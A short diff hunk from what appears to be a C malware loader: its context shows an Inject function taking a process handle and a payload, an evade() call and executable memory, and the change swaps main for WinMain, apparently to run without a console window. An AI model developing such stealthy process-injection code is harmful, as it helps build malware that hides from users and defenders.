@@ -128,7 +128,7 @@ int Inject(HANDLE hProc, unsigned char * payload, unsigned int lengthyBoi){
 	return -1;
 }
 
-int main(void) {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
 	evade();
 
 	void * exec_mem;
